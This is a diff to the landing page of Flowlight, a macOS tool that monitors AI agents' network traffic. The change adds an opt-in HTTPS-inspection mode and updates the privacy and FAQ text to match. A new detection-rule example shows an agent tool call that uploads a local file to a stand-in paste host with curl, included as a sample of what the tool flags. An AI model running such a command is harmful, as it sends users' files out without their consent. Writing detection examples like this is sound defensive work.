@@ -182,6 +182,12 @@
             <p class="example">api.github.com · via github MCP &nbsp;·&nbsp; paste.example · via curl</p></div>
         </div>
         <div class="rule">
+          <span class="sev info">⌕ Opt-in</span>
+          <div><h3>Tool calls, from the model's own responses</h3>
+            <p>Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run, then ties each tool's request back to the call that caused it.</p>
+            <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
+        </div>
+        <div class="rule">
           <span class="sev critical">⚠ Critical</span>
           <div><h3>Sensitive channel</h3>
             <p>The agent sends email, transfers files, opens SSH or remote desktop, goes through a tunnel or proxy, or talks to a database.</p>
@@ -250,7 +256,7 @@
           <div class="protos"><span>APNs</span><span>FCM</span><span>Docker</span><span>Kubernetes</span><span>Ollama</span></div></div>
       </div>
       <p class="footnote">Flowlight observes every TCP and UDP flow, which covers essentially all app traffic. ICMP (ping) and
-        other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted.</p>
+        other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted unless you turn on HTTPS inspection.</p>
     </div>
   </section>
 
@@ -302,7 +308,7 @@
       </div>
       <div class="privacy">
         <div><strong>Stays on your Mac</strong><p>One local SQLite file. No account, no cloud sync, no telemetry.</p></div>
-        <div><strong>Metadata only</strong><p>Hostnames, ports and byte counts. Packet contents are never stored.</p></div>
+        <div><strong>Metadata by default</strong><p>Hostnames, ports and byte counts. Decrypting HTTPS is a separate mode you have to turn on, and it stays on your Mac.</p></div>
         <div><strong>Filtered in the kernel</strong><p>Capture passes only DNS answers and TLS ClientHellos. Everything else is dropped before Flowlight sees it.</p></div>
         <div><strong>Lookups you control</strong><p>Naming who owns an address sends only public IPs with no hostname to Team Cymru, and turns off in one click. The daily update check only asks GitHub for the latest version, and can be turned off too.</p></div>
       </div>
@@ -361,10 +367,11 @@ open Flowlight.app --args -FLDemo YES</pre>
         <details><summary>Does Flowlight block traffic?</summary>
           <p>No. It observes and alerts, including when an agent leaves its allowlist. Blocking allowlist violations is on the roadmap for the Network Extension build.</p></details>
         <details><summary>Can it read my HTTPS traffic?</summary>
-          <p>No, and it doesn't try. It reads the hostname a client asks for when it opens a connection (TLS SNI) and the
-            DNS answers that map names to addresses. Contents stay encrypted. Full request inspection would need a local
-            TLS-intercepting proxy with its own trusted certificate, which is a different trust model, so it's on the roadmap only
-            as a separate mode you'd have to turn on. Some apps pin their certificates and would still refuse it.</p></details>
+          <p>Not by default. It reads the hostname a client asks for when it opens a connection (TLS SNI) and the DNS answers
+            that map names to addresses, and contents stay encrypted. If you want the full picture, <strong>HTTPS inspection</strong> is a
+            separate, opt-in mode: Flowlight becomes a local proxy with its own certificate authority and decrypts the apps you route
+            through it (AI agents only, by default), including every tool call a model asks an agent to run. Apps that pin their
+            certificates still refuse it, and Apple services and password managers are never decrypted.</p></details>
         <details><summary>How is this different from Little Snitch or LuLu?</summary>
           <p>Those are firewalls that ask you to allow connections. Flowlight is an analytics tool: history at any zoom,
             anomaly baselines, and rules built for AI agents. They work well side by side.</p></details>
